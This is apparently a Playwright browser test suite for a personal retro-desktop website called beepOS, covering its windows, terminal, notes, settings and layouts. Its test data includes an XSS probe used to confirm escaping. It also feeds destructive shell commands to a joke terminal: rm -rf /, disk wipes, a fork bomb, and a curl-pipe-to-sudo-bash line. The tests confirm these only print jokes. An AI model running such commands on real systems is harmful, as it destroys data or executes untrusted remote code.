const { chromium } = require(process.env.PLAYWRIGHT_MODULE || 'playwright');
const assert = require('node:assert/strict');
const {execFileSync} = require('node:child_process');
process.chdir(require('node:path').join(__dirname, '..'));
const base = process.env.BEEPOS_URL || 'http://127.0.0.1:8765';
const path = require('node:path');
const fs = require('node:fs');
const outputDir = process.env.BEEPOS_SCREENSHOTS || path.join(require('node:os').tmpdir(), 'beepos-screenshots');
fs.mkdirSync(outputDir, {recursive:true});
let browser;
(async () => {
  browser = await chromium.launch({ headless: true });
  const context = await browser.newContext({viewport:{width:1440,height:900},deviceScaleFactor:1,reducedMotion:'reduce'});
  const page = await context.newPage();
  page.setDefaultTimeout(8000);
  const errors = [];
  page.on('pageerror', e => errors.push(e.message));
  const checks=[];
  async function check(label, fn) { await fn(); checks.push(label); console.log('PASS', label); }
  const active = id => page.locator(`#window-${id}.is-active`);
  const open = async id => {
    await page.locator('.start-button').click();
    await page.locator(`.start-menu [data-open="${id}"]`).click();
    await active(id).waitFor();
    await active(id).locator('.app-content').waitFor();
  };
  const close = async id => { await active(id).locator('.window-controls [data-action="close"]').click(); };
  await page.goto(base);
  await active('home').locator('.home-content').waitFor();
  await check('home and sticky note open with no browser errors', async()=> {
    assert.equal(await page.locator('.os-window').count(),2);
    assert.deepEqual(errors, []);
    const sizes=await active('home').locator('.window-body').evaluate(el=>[el.scrollHeight,el.clientHeight]);
    assert.ok(sizes[0] <= sizes[1]+1, 'home should fit at desktop size');
  });
  await page.screenshot({path:path.join(outputDir,'desktop.png'),animations:'disabled'});
  await check('all original homepage destinations and account names retained', async()=> {
    const old=execFileSync('git',['show','HEAD:index.html'],{encoding:'utf8'});
    const oldLinks=[...old.matchAll(/href="(https:[^"]+)"/g)].map(x=>x[1]);
    const links=await page.locator('.home-content a').evaluateAll(els=>els.map(el=>el.href));
    for(const link of oldLinks) assert.ok(links.includes(link), `missing link ${link}`);
    for(const text of ['yet_another_account123','UniqueName54321','AltF4ForWeatherUpdates','DifferentDance8','SomeoneReturns','Olflix','maybe making a comeback']) assert.ok((await page.locator('.home-content').textContent()).includes(text),text);
  });
  await check('quotes open as an app and retain every joke', async()=> {
    await active('home').locator('[data-open="quotes"]').click();
    await active('quotes').locator('blockquote').first().waitFor();
    assert.equal(await active('quotes').locator('blockquote').count(),3);
    assert.match(await active('quotes').textContent(),/buoy-meets-gull/);
    assert.match(await active('quotes').textContent(),/before it was cool/);
    assert.match(await active('quotes').textContent(),/third wheel ducks/);
  });
  await check('window drag and keyboard movement', async()=> {
    const bar=active('quotes').locator('.window-titlebar');
    const before=await active('quotes').boundingBox();
    const point=await bar.boundingBox();
    await page.mouse.move(point.x+170,point.y+12);
    await page.mouse.down(); await page.mouse.move(point.x+210,point.y+37,{steps:5}); await page.mouse.up();
    const after=await active('quotes').boundingBox();
    assert.equal(Math.round(after.x-before.x),40); assert.equal(Math.round(after.y-before.y),25);
    await bar.focus(); await page.keyboard.press('ArrowLeft');
    assert.equal(Math.round((await active('quotes').boundingBox()).x-after.x),-10);
  });
  await check('native resize keeps the window usable', async()=> {
    const before=await active('quotes').boundingBox();
    await page.mouse.move(before.x+before.width-3,before.y+before.height-3);
    await page.mouse.down(); await page.mouse.move(before.x+before.width+35,before.y+before.height+17,{steps:5}); await page.mouse.up();
    const after=await active('quotes').boundingBox();
    assert.ok(after.width>before.width,'resize handle changes width');
  });
  await check('minimize, taskbar restore, maximize and restore', async()=> {
    await active('quotes').locator('.window-controls [data-action="minimize"]').click();
    assert.equal(await page.locator('#window-quotes').isVisible(),false);
    await page.locator('.task-button[aria-controls="window-quotes"]').click();
    await active('quotes').waitFor();
    const original=await active('quotes').boundingBox();
    await active('quotes').locator('.window-controls [data-action="maximize"]').click();
    assert.equal(await active('quotes').evaluate(el=>el.classList.contains('is-maximized')),true);
    assert.equal(await active('quotes').locator('.window-controls [data-action="maximize"]').getAttribute('title'),'Restore window');
    await active('quotes').locator('.window-controls [data-action="maximize"]').click();
    assert.equal(Math.round((await active('quotes').boundingBox()).width),Math.round(original.width));
  });
  await check('apps are single-instance and close/reopen cleanly', async()=> {
    await open('quotes'); assert.equal(await page.locator('#window-quotes').count(),1);
    await close('quotes'); assert.equal(await page.locator('#window-quotes').count(),0);
    await open('quotes'); await active('quotes').locator('blockquote').first().waitFor();
    assert.equal(await page.locator('.task-button[aria-controls="window-quotes"]').count(),1);
  });
  await check('account graveyard retains all original paragraphs and links', async()=> {
    await open('inactive'); await active('inactive').locator('.accounts-content').waitFor();
    const old=execFileSync('git',['show','HEAD:inactive.html'],{encoding:'utf8'});
    const preserved=await page.evaluate(old=> {
      const doc=new DOMParser().parseFromString(old,'text/html');
      const now=document.querySelector('.accounts-content');
      const norm=s=>s.replace(/\s+/g,' ').trim();
      const body=norm(now.textContent);
      return [...doc.querySelectorAll('p')].filter(el=>!body.includes(norm(el.textContent))).map(el=>el.textContent);
    },old);
    assert.deepEqual(preserved,[]);
    const oldLinks=[...old.matchAll(/href="(https:[^"]+)"/g)].map(x=>x[1]);
    const links=await active('inactive').locator('a').evaluateAll(els=>els.map(el=>el.href));
    for(const link of oldLinks) assert.ok(links.includes(link), `missing link ${link}`);
    await page.screenshot({path:path.join(outputDir,'accounts.png'),animations:'disabled'});
  });
  await check('Nouveau diagnostics work for unsupported and supported browsers', async()=> {
    await open('nouveau'); await active('nouveau').locator('#status-title').waitFor();
    assert.match(await active('nouveau').locator('#status-title').textContent(),/not detected/);
    await page.evaluate(()=> { window.nouveau={features:['browser-detection']}; });
    await active('nouveau').locator('#check-again').click();
    assert.match(await active('nouveau').locator('#status-title').textContent(),/^Yes!/);
    await page.evaluate(()=>Object.defineProperty(window,'nouveau',{configurable:true,get(){throw Error('access denied')}}));
    await active('nouveau').locator('#check-again').click();
    assert.match(await active('nouveau').locator('#status-title').textContent(),/not detected/);
    await page.evaluate(()=>delete window.nouveau);
  });
  await check('terminal commands, history, safe echo, and opening apps', async()=> {
    await open('terminal');
    const input=active('terminal').locator('input');
    async function command(s){await input.fill(s); await input.press('Enter');}
    await command('help'); assert.match(await active('terminal').textContent(),/open <app>/);
    await command('echo <img src=x onerror=alert(1)>');
    assert.equal(await active('terminal').locator('img').count(),0);
    assert.match(await active('terminal').textContent(),/<img src=x onerror=alert\(1\)>/);
    await input.press('ArrowUp'); assert.equal(await input.inputValue(),'echo <img src=x onerror=alert(1)>');
    await command('beep'); assert.match(await active('terminal').textContent(),/beep! :3/);
    await command('open about'); await active('about').waitFor();
    await page.locator('.task-button[aria-controls="window-terminal"]').click();
    await command('clear'); assert.equal(await active('terminal').locator('.terminal-output').textContent(),'');
    await command('exit'); assert.equal(await page.locator('#window-terminal').count(),0);
  });
  await check('sticky note saves text without interpreting HTML', async()=> {
    await open('note');
    await active('note').locator('textarea').fill('<b>test note</b>\nbeep beep');
    assert.match(await active('note').textContent(),/saved on this computer/);
    await close('note'); await open('note');
    assert.equal(await active('note').locator('textarea').inputValue(),'<b>test note</b>\nbeep beep');
  });
  await check('display settings and sound persist after reload', async()=> {
    await open('settings');
    await active('settings').locator('[for="theme-lagoon"]').click();
    assert.equal(await active('settings').locator('[value="lagoon"]').isChecked(),true);
    await active('settings').locator('[for="wallpaper-dots"]').click();
    await active('settings').locator('[for="desktop-sound"]').click();
    assert.equal(await page.locator('.desktop').evaluate(el=>getComputedStyle(el).backgroundColor),'rgb(53, 102, 109)');
    await page.reload(); await active('home').locator('.home-content').waitFor();
    assert.equal(await page.locator('.desktop').evaluate(el=>getComputedStyle(el).backgroundColor),'rgb(53, 102, 109)');
    assert.equal(await page.locator('.desktop').evaluate(el=>el.classList.contains('flat')),true);
    assert.equal(await page.locator('.tray-button').getAttribute('aria-pressed'),'true');
    await open('note'); assert.equal(await active('note').locator('textarea').inputValue(),'<b>test note</b>\nbeep beep');
    await page.evaluate(()=>localStorage.clear());
  });
  await check('start menu keyboard navigation and Escape restore focus', async()=> {
    await page.locator('.start-button').click();
    assert.equal(await page.locator('.start-menu .start-item').first().evaluate(el=>document.activeElement===el),true);
    await page.keyboard.press('ArrowDown');
    assert.equal(await page.locator('.start-menu .start-item').nth(1).evaluate(el=>document.activeElement===el),true);
    await page.keyboard.press('Escape');
    assert.equal(await page.locator('.start-menu').isVisible(),false);
    assert.equal(await page.locator('.start-button').evaluate(el=>document.activeElement===el),true);
  });
  await check('show desktop hides windows; taskbar brings them back', async()=> {
    await page.locator('.desktop-button').click();
    assert.equal(await page.locator('.os-window:visible').count(),0);
    await page.locator('.task-button[aria-controls="window-home"]').click();
    await active('home').waitFor();
  });
  await check('all existing direct URLs work and their asset requests succeed', async()=> {
    for(const [path,id,selector] of [['/quotes.html','quotes','blockquote'],['/inactive.html','inactive','.accounts-content'],['/nouveau/nouveautest.html','nouveau','#status-title'],['/404.html','notfound','.error-content']]){
      const failures=[]; const handler=r=>{if(r.status()>=400) failures.push(`${r.status()} ${r.url()}`)};
      page.on('response',handler);
      await page.goto(base+path); await active(id).locator(selector).first().waitFor();
      assert.deepEqual(failures,[],path);
      await open('home'); await active('home').locator('.home-content').waitFor();
      assert.ok(await active('home').locator('svg use').first().evaluate(el=>new URL(el.href.baseVal).pathname.startsWith('/assets/')));
      page.off('response',handler);
    }
  });
  await check('mobile and tablet layouts have no horizontal overflow or inaccessible windows', async()=> {
    for(const width of [320,390,640,768,1024,1440]){
      await page.setViewportSize({width,height:844});
      await page.goto(base); await active('home').locator('.home-content').waitFor();
      const overflow=await active('home').locator('.window-body').evaluate(el=>el.scrollWidth-el.clientWidth);
      assert.ok(overflow<=1, `home overflow at ${width}: ${overflow}`);
      for(const id of ['quotes','inactive','nouveau','settings','computer','terminal','about','note']){
        await open(id);
        const bbox=await active(id).boundingBox();
        assert.ok(bbox.x>=0 && bbox.x+bbox.width<=width, `${id} outside viewport at ${width}`);
        const h=await active(id).locator('.window-body').evaluate(el=>el.scrollWidth-el.clientWidth);
        assert.ok(h<=1,`${id} horizontal overflow at ${width}: ${h}`);
      }
      if(width===390){ await open('home'); await page.screenshot({path:path.join(outputDir,'mobile.png'),animations:'disabled'}); }
    }
  });
  await check('network failure shows a recoverable error and retry succeeds', async()=> {
    await page.setViewportSize({width:1440,height:900}); await page.goto(base); await active('home').waitFor();
    await page.route('**/quotes.html',r=>r.abort());
    await open('quotes'); await active('quotes').locator('[data-retry]').waitFor();
    await page.unroute('**/quotes.html');
    await active('quotes').locator('[data-retry]').click();
    await active('quotes').locator('blockquote').first().waitFor();
  });
  await check('offline status reflects browser connectivity', async()=> {
    await context.setOffline(true);
    await page.waitForFunction(()=>document.querySelector('.connection-label').textContent==='offline');
    await context.setOffline(false);
    await page.waitForFunction(()=>document.querySelector('.connection-label').textContent==='online');
  });
  await check('static content remains readable with JavaScript disabled', async()=> {
    const nojs=await browser.newContext({javaScriptEnabled:false});
    const plain=await nojs.newPage();
    for(const [path,selector] of [['/','.home-content'],['/quotes.html','.quotes-content'],['/inactive.html','.accounts-content'],['/nouveau/nouveautest.html','.nouveau-content'],['/404.html','.error-content']]){
      await plain.goto(base+path); assert.ok(await plain.locator(selector).isVisible(),path);
      assert.equal(await plain.locator('.os-window').count(),0);
    }
    await nojs.close();
  });
  await check('storage-disabled browsers still boot and explain unsaved notes', async()=> {
    const restricted=await browser.newContext();
    await restricted.addInitScript(()=>Object.defineProperty(window,'localStorage',{get(){throw new DOMException('blocked','SecurityError')}}));
    const p=await restricted.newPage();
    await p.goto(base); await p.locator('.home-content').waitFor();
    await p.locator('.start-button').click(); await p.locator('.start-menu [data-open="note"]').click();
    await p.locator('#sticky-note').fill('do not lose me');
    assert.match(await p.locator('.note-save').textContent(),/storage unavailable/);
    await restricted.close();
  });
  await check('98.css controls, fonts, shared frame and icon scale', async()=> {
    await page.goto(base); await active('home').locator('.home-content').waitFor();
    await page.evaluate(()=>document.fonts.ready);
    assert.equal(await page.evaluate(()=>document.fonts.check('11px "Pixelated MS Sans Serif"')),true);
    for (const [selector,size] of [['.window-titlebar > svg',16],['.shortcut svg',32],['.welcome-computer',32]]) {
      assert.equal(await page.locator(selector).first().evaluate(el=>el.getBoundingClientRect().width),size);
    }
    await open('note');
    const frames=await page.locator('.os-window').evaluateAll(els=>els.map(el=>({background:getComputedStyle(el).backgroundColor,shadow:getComputedStyle(el).boxShadow})));
    assert.deepEqual(frames[0],frames[1]);
    for(const selector of ['.minimize','.maximize','.close']) assert.match(await active('note').locator(selector).evaluate(el=>getComputedStyle(el).backgroundImage),/data:image\/svg/);
    await active('note').locator('.window-controls [data-action="maximize"]').click();
    assert.equal(await active('note').locator('.restore').count(),1);
    await active('note').locator('.window-controls [data-action="maximize"]').click();
    await open('settings');
    await active('settings').locator('#desktop-sound').focus();
    const checked=await active('settings').locator('#desktop-sound').isChecked();
    await page.keyboard.press('Space');
    assert.equal(await active('settings').locator('#desktop-sound').isChecked(),!checked);
    assert.ok(await active('settings').locator('.settings-note').isVisible());
    const fit=await active('settings').locator('.window-body').evaluate(el=>el.scrollHeight<=el.clientHeight+1);
    assert.ok(fit,'display settings should fit on desktop');
    await page.screenshot({path:path.join(outputDir,'settings-desktop.png'),animations:'disabled'});
    await page.setViewportSize({width:390,height:844});
    const glyphPosition=await active('settings').locator('.close').evaluate(el=>getComputedStyle(el).backgroundPosition);
    assert.equal(glyphPosition, '50% 50%');
    await page.screenshot({path:path.join(outputDir,'settings-mobile.png'),animations:'disabled'});
    await page.goto(base); await active('home').locator('.home-content').waitFor();
    await page.screenshot({path:path.join(outputDir,'mobile.png'),animations:'disabled'});
  });
  await check('Explorer selects files and File > Open reuses app routing', async()=> {
    await page.setViewportSize({width:1440,height:900}); await page.goto(base);
    await active('home').locator('.home-content').waitFor(); await open('computer');
    const pane=active('computer');
    assert.equal(await pane.locator('.app-file').count(),8);
    assert.equal(await pane.locator('.address-bar').count(),1);
    assert.equal(await pane.locator('h1').count(),0,'explorer should not contain a page hero');
    await pane.locator('.app-file[data-open="quotes"]').click();
    assert.equal(await pane.locator('[aria-selected="true"]').count(),1);
    assert.match(await pane.locator('.window-status').textContent(),/1 object selected/);
    assert.equal(await active('computer').count(),1,'single click selects rather than opens');
    await pane.locator('summary').filter({hasText:/^File$/}).click();
    await pane.locator('[data-explorer="open"]').click();
    await active('quotes').locator('blockquote').first().waitFor();
    assert.equal(await page.locator('#window-quotes .address-bar').count(),0);
    await page.screenshot({path:path.join(outputDir,'quotes-native.png'),animations:'disabled'});
    await page.locator('.task-button[aria-controls="window-computer"]').click();
    await active('computer').locator('.app-file[data-open="quotes"]').dblclick();
    await active('quotes').waitFor();
    assert.equal(await page.locator('#window-quotes').count(),1);
  });
  await check('Explorer icon views, arrow navigation and menu keyboard interaction', async()=> {
    await open('computer');
    const pane=active('computer');
    await pane.locator('summary').filter({hasText:/^View$/}).click();
    await pane.locator('[data-explorer="small"]').click();
    assert.equal(await pane.locator('.small-icons').count(),1);
    assert.equal(await pane.locator('.app-file svg').first().evaluate(el=>el.getBoundingClientRect().width),16);
    await pane.locator('.app-file').first().click();
    await pane.locator('.app-file').first().press('End');
    assert.equal(await pane.locator('[aria-selected="true"]').getAttribute('data-open'),'note');
    await pane.locator('[aria-selected="true"]').press('Enter');
    await active('note').waitFor(); await open('computer');
    const summary=pane.locator('summary').filter({hasText:/^File$/});
    await summary.focus(); await page.keyboard.press('ArrowDown');
    assert.equal(await pane.locator('[data-explorer="open"]').evaluate(el=>el===document.activeElement),true);
    await page.keyboard.press('Escape');
    await summary.focus(); await page.keyboard.press('ArrowUp');
    assert.equal(await pane.locator('.menu-popup [data-action="close"]').evaluate(el=>el===document.activeElement),true);
    await page.keyboard.press('Escape');
    assert.equal(await pane.locator('.app-menu[open]').count(),0);
    await pane.locator('summary').filter({hasText:/^View$/}).click();
    await page.screenshot({path:path.join(outputDir,'explorer-menu.png'),animations:'disabled'});
    await pane.locator('[data-explorer="large"]').click();
    assert.equal(await pane.locator('.small-icons').count(),0);
    assert.equal(await pane.locator('.app-file svg').first().evaluate(el=>el.getBoundingClientRect().width),32);
    await page.screenshot({path:path.join(outputDir,'explorer-desktop.png'),animations:'disabled'});
    await pane.locator('summary').filter({hasText:/^File$/}).click();
    await pane.locator('.menu-popup [data-action="close"]').click();
    assert.equal(await page.locator('#window-computer').count(),0);
  });
  await check('Explorer supports touch opening on phones', async()=> {
    const mobile=await browser.newContext({viewport:{width:390,height:844},hasTouch:true,isMobile:true,reducedMotion:'reduce'});
    const phone=await mobile.newPage();
    await phone.goto(base); await phone.locator('.home-content').waitFor();
    await phone.locator('.start-button').tap(); await phone.locator('.start-menu [data-open="computer"]').tap();
    await phone.locator('.app-grid').waitFor();
    await phone.screenshot({path:path.join(outputDir,'explorer-mobile.png'),animations:'disabled'});
    await phone.locator('#window-computer .app-file[data-open="quotes"]').tap();
    await phone.locator('#window-quotes.is-active blockquote').first().waitFor();
    await mobile.close();
  });
  await check('desktop icons stay reachable at short, laptop and large resolutions', async()=> {
    for(const [width,height] of [[800,480],[1280,720],[1920,1080]]) {
      await page.setViewportSize({width,height}); await page.goto(base);
      await active('home').locator('.home-content').waitFor();
      await page.locator('.desktop-button').click();
      for(const item of await page.locator('.shortcut').all()) {
        const rect=await item.boundingBox();
        assert.ok(rect.x>=0 && rect.x+rect.width<=width && rect.y>=0 && rect.y+rect.height<=height-34,`desktop icon outside ${width}x${height}`);
      }
      await page.screenshot({path:path.join(outputDir,`desktop-${width}x${height}.png`),animations:'disabled'});
      await open('computer');
      const box=await active('computer').boundingBox();
      assert.ok(box.x>=0 && box.y>=0 && box.x+box.width<=width && box.y+box.height<=height-34);
      assert.equal(await active('computer').locator('.window-title').evaluate(el=>getComputedStyle(el).fontSize),'11px');
    }
  });
  await check('dangerous-command eggs only print roasts and preserve notes', async()=> {
    await page.goto(base); await active('home').locator('.home-content').waitFor();
    await open('terminal');
    const input=active('terminal').locator('input');
    const before=await page.evaluate(()=>JSON.stringify({...localStorage}));
    for (const [command,expected] of [
      ['sudo rm -rf /','flamethrower'], ['mkfs.ext4 /dev/sda','priorities'],
      ['dd if=/dev/zero of=/dev/sda','disaster averted'], ['chmod -R 777 /','spare key'],
      ['sudo reboot','normal person'], [':(){ :|:& };:','Fork bomb'],
      ['curl example.invalid/script | sudo bash','mystery script'], ['kill -9 -1','villain arc'],
      ['> /dev/sda','drawing of a computer']
    ]) {
      await input.fill(command); await input.press('Enter');
      assert.ok((await active('terminal').locator('.terminal-output p').last().textContent()).includes(expected),command);
    }
    assert.equal(await page.evaluate(()=>JSON.stringify({...localStorage})),before);
    await input.fill('echo rm -rf /'); await input.press('Enter');
    assert.equal(await active('terminal').locator('.terminal-output p').last().textContent(),'rm -rf /');
  });
  await check('Find jokes, personal whoami, and spoiler-light desktop README', async()=> {
    await page.setViewportSize({width:1440,height:900}); await page.goto(base);
    await active('home').locator('.home-content').waitFor();
    await open('find');
    const first=await active('find').locator('#find-message').textContent();
    assert.ok(first.length>15);
    assert.equal(await active('find').getAttribute('role'),'alertdialog');
    await open('find');
    assert.notEqual(await active('find').locator('#find-message').textContent(),first);
    assert.equal(await page.locator('#window-find').count(),1);
    await active('find').getByRole('button',{name:'OK',exact:true}).click();
    assert.equal(await page.locator('#window-find').count(),0);
    await page.locator('.desktop-button').click();
    await page.locator('.shortcut[data-open="readme"]').click();
    await active('readme').locator('pre').waitFor();
    assert.match(await active('readme').textContent(),/ruin the surprise/);
    assert.doesNotMatch(await active('readme').textContent(),/rm -rf|mkfs|fork bomb/);
    await page.screenshot({path:path.join(outputDir,'readme-desktop.png'),animations:'disabled'});
    await open('terminal');
    await active('terminal').locator('input').fill('whoami');
    await active('terminal').locator('input').press('Enter');
    const bio=await active('terminal').locator('.terminal-output').textContent();
    for(const word of ['Bug Hayes','penname','privacy','17M','gay','protogen','vibecoder','Geometry Dash','stories','hobbies']) assert.ok(bio.includes(word),word);
    await page.setViewportSize({width:390,height:844});
    await open('find'); await page.screenshot({path:path.join(outputDir,'find-mobile.png'),animations:'disabled'});
    await active('find').getByRole('button',{name:'OK',exact:true}).click();
    await page.locator('.task-button[aria-controls="window-readme"]').click();
    assert.equal(await active('readme').locator('pre').evaluate(el=>el.scrollWidth>el.clientWidth),false);
    await page.screenshot({path:path.join(outputDir,'readme-mobile.png'),animations:'disabled'});
  });
  await check('desktop context actions, properties, dismissal and window delegation', async()=> {
    await page.setViewportSize({width:1440,height:900}); await page.goto(base);
    await active('home').locator('.home-content').waitFor(); await page.locator('.desktop-button').click();
    const menu=page.locator('.desktop-context-menu');
    await page.locator('.desktop').click({button:'right',position:{x:1400,y:830}});
    assert.equal(await menu.getByRole('menuitem').count(),1);
    const bounds=await menu.boundingBox();
    assert.ok(bounds.x+bounds.width<=1440 && bounds.y+bounds.height<=900);
    await menu.getByRole('menuitem').click();
    assert.match(await page.locator('.toast').textContent(),/wallpaper/);
    assert.equal(await menu.isVisible(),false);
    await page.locator('.shortcut[data-open="readme"]').click({button:'right'});
    assert.deepEqual(await menu.getByRole('menuitem').allTextContents(),['Open','Properties']);
    await menu.getByRole('menuitem',{name:'Properties',exact:true}).click();
    await active('properties').locator('#properties-name').waitFor();
    assert.equal(await active('properties').locator('#properties-name').textContent(),'README.md');
    assert.equal(await active('properties').locator('#properties-target').textContent(),'C:\\beepOS\\my stuff\\README.md');
    await page.locator('.shortcut[data-open="terminal"]').click({button:'right'});
    await menu.getByRole('menuitem',{name:'Properties',exact:true}).click();
    assert.equal(await page.locator('#window-properties').count(),1);
    assert.equal(await active('properties').locator('#properties-name').textContent(),'Beep prompt');
    await page.screenshot({path:path.join(outputDir,'desktop-context-properties.png'),animations:'disabled'});
    await page.locator('.shortcut[data-open="quotes"]').click({button:'right'});
    await menu.getByRole('menuitem',{name:'Open',exact:true}).click();
    await active('quotes').locator('blockquote').first().waitFor();
    const passed=await active('quotes').locator('.window-body').evaluate(el=> {
      const first=new MouseEvent('contextmenu',{bubbles:true,cancelable:true});
      el.dispatchEvent(first);
      let handled=false;
      el.addEventListener('contextmenu',event=>{handled=true;event.preventDefault()},{once:true});
      const second=new MouseEvent('contextmenu',{bubbles:true,cancelable:true}); el.dispatchEvent(second);
      return !first.defaultPrevented && handled && second.defaultPrevented;
    });
    assert.equal(passed,true,'windows own their contextmenu events');
    assert.equal(await menu.isVisible(),false);
    const shortcut=page.locator('.shortcut[data-open="home"]');
    await shortcut.focus(); await page.keyboard.press('Shift+F10');
    assert.equal(await menu.isVisible(),true);
    await page.keyboard.press('ArrowDown');
    assert.equal(await menu.getByRole('menuitem',{name:'Properties',exact:true}).evaluate(el=>el===document.activeElement),true);
    await page.keyboard.press('Escape');
    assert.equal(await shortcut.evaluate(el=>el===document.activeElement),true);
    await shortcut.click({button:'right'}); await page.locator('.desktop-button').click();
    assert.equal(await menu.isVisible(),false);
    await page.setViewportSize({width:390,height:844});
    await page.locator('.shortcut[data-open="readme"]').click({button:'right'});
    await page.screenshot({path:path.join(outputDir,'desktop-context-mobile.png'),animations:'disabled'});
    const mobileBounds=await menu.boundingBox(); assert.ok(mobileBounds.x>=0 && mobileBounds.x+mobileBounds.width<=390);
  });
  assert.deepEqual(errors,[],'no uncaught browser errors');
  console.log(`\n${checks.length} browser checks passed; no uncaught JavaScript errors.`);
  await browser.close();
})().catch(e=>{console.error(e);process.exitCode=1}).finally(async()=>{await browser?.close()});
